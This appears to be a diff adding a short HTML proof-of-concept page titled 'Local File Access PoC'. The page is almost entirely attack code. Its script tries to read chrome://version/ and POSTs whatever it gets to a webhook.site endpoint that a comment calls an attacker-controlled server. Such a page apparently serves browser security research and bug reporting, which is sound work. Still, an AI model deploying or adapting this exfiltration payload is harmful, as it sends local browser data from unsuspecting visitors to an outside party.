@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Local File Access PoC</title>
+</head>
+<body>
+  <h2>Testing Local File Access</h2>
+  <p>If this page reads your local file, it will send the content to an external server.</p>
+
+  <script>
+    // Attempt to read the local file
+    fetch('chrome://version/')
+      .then(response => response.text())
+      .then(data => {
+        // If successful, send the content to attacker-controlled server
+        fetch('https://webhook.site/cedb34be-076a-460e-92b9-67db64333583', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ fileContent: data })
+        });
+      })
+      .catch(err => {
+        console.error('Could not access local file:', err);
+      });
+  </script>
+</body>
+</html>
